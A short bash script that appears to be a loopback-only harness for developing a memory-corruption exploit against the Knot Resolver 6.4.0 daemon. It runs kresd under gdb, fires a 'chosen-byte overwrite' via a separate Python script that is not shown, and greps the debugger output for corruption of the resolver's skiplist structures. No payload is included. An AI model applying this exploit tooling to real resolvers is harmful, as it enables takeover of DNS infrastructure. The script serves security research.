#!/bin/bash
# Loopback-only. Wake-5 bounded probe: F6 chosen-byte overwrite, then trailing
# streams; watch the corrupted ksl's `search` field and ksl operations on it.
set +e
BASE=/home/mesh-home/mishe-tauftauf2shell/lab/frontier/knotresolver2shell
KRESD="$BASE/build/knot-resolver-6.4.0-jemalloc/jemalloc-build/daemon/kresd"
LOG="$BASE/harness/ksl-search.txt"
: > "$LOG"
pkill -9 -f 'knot-resolver-6.4.0-jemalloc/jemalloc-build/daemon/kresd' 2>/dev/null
pkill -9 -f 'ksl-search.gdb' 2>/dev/null
sleep 1
gdb -q -batch -x "$BASE/harness/ksl-search.gdb" "$KRESD" \
  > "$BASE/harness/ksl-search-stdout.log" 2>&1 &
GB=$!
echo "[runner] gdb pid=$GB"
sleep 5
echo "=== listener check ==="
ss -lun | grep 8855 || echo "no 8855 socket yet"
echo "=== F6 + trailing frames (grooms=0, follow) ==="
"$BASE/poc/venv/bin/python" "$BASE/harness/ksl_marker.py" 8855 follow 2>&1
sleep 3
kill -9 $GB 2>/dev/null
pkill -9 -f 'knot-resolver-6.4.0-jemalloc/jemalloc-build/daemon/kresd' 2>/dev/null
sleep 1
echo "=== ksl-search oracle ==="
cat "$LOG"
echo "=== gdb stdout (watchpoint/STOP lines) ==="
grep -E 'watchpoint|DISPATCH|STOP|Program received|ksl_insert|ksl_update_key|ksl_remove_hint|Inferior' "$BASE/harness/ksl-search-stdout.log" || echo "(no watchpoint/dispatch lines)"
echo "=== END ==="
